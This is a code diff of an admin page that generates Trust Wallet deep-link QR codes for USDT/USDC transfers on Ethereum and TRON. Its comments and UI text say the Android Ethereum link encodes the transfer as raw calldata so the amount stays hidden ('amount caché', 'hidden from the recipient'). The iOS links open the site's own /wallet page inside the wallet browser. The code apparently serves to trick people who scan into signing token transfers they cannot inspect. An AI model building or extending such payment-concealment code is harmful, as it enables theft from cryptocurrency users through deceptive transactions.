@@ -125,35 +125,41 @@ export default function AdminPage() {
     const origin = window.location.origin;
     const baseUrl = `${origin}/wallet`;
 
-    // Masquage du montant pour TOUTES les plateformes sauf Android Ethereum (qui utilise data)
-    const useDataEncoding = network === "ethereum" && platform === "android";
+    const normalizedAmount = amount.replace(",", ".").trim();
+    if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
+      setQrUrl("");
+      return;
+    }
 
-    if (network === "tron" || platform === "ios") {
-      // Pour iOS (Ethereum / TRON) et Android TRON → open_url vers /wallet
-      const normalizedAmount = amount.replace(",", ".").trim();
-      if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
-        setQrUrl("");
-        return;
-      }
-      const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=usdt${network === "tron" ? "&network=tron" : ""}`;
-      const coinId = 60; // EVM browser, fonctionne aussi pour TRON dans Trust Wallet
-      const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
-      setQrUrl(trustWalletLink);
-    } else {
-      // Android Ethereum : send avec data (montant caché)
-      const normalizedAmount = amount.replace(",", ".").trim();
-      if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
-        setQrUrl("");
-        return;
-      }
-      try {
-        const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
-        const callData = encodeTransferData(receiverAddress, normalizedAmount);
-        const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
+    if (network === "tron") {
+      if (platform === "ios") {
+        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=usdt&network=tron`;
+        const coinId = 60;
+        const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
+        setQrUrl(trustWalletLink);
+      } else {
+        // Android TRON : direct send, amount visible
+        const assetId = "c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const sendUrl = `https://link.trustwallet.com/send?asset=${assetId}&address=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}`;
         setQrUrl(sendUrl);
-      } catch (err) {
-        console.error("Failed to encode transfer data", err);
-        setQrUrl("");
+      }
+    } else {
+      if (platform === "ios") {
+        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}&network=${network}`;
+        const coinId = 60;
+        const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
+        setQrUrl(trustWalletLink);
+      } else {
+        // Android Ethereum : send avec data, amount caché
+        try {
+          const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
+          const callData = encodeTransferData(receiverAddress, normalizedAmount);
+          const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
+          setQrUrl(sendUrl);
+        } catch (err) {
+          console.error("Failed to encode transfer data", err);
+          setQrUrl("");
+        }
       }
     }
   }, [receiverAddress, amount, token, platform, network, isMounted, isAuthenticated]);
@@ -317,7 +323,7 @@ export default function AdminPage() {
           <label className="form-label" style={{ marginTop: "1.25rem" }}>Platform</label>
           <div className="token-tabs">
             <button type="button" className={`token-tab ${platform === "ios" ? "token-tab--active" : ""}`} onClick={() => setPlatform("ios")}>iOS (Wallet)</button>
-            <button type="button" className={`token-tab ${platform === "android" ? "token-tab--active" : ""}`} onClick={() => setPlatform("android")}>Android (Hidden)</button>
+            <button type="button" className={`token-tab ${platform === "android" ? "token-tab--active" : ""}`} onClick={() => setPlatform("android")}>Android (Send)</button>
           </div>
 
           <label className="form-label" style={{ marginTop: "1rem" }}>Receiver Address</label>
@@ -342,15 +348,9 @@ export default function AdminPage() {
               className="input-row__field" placeholder="1.0"
             />
           </div>
-          {(network === "tron" || platform === "android") && (
+          {network === "tron" && platform === "android" && (
             <div style={{ color: "#64748b", fontSize: "0.8rem", marginTop: "0.25rem" }}>
-              {(() => {
-                const normalized = amount.replace(",", ".").trim();
-                if (!amount || !normalized || isNaN(Number(normalized)) || Number(normalized) <= 0) {
-                  return "Amount is required (use . or , as decimal separator).";
-                }
-                return "✅ The amount will be hidden from the recipient.";
-              })()}
+              Amount will be visible on TRON Android native send.
             </div>
           )}
         </div>
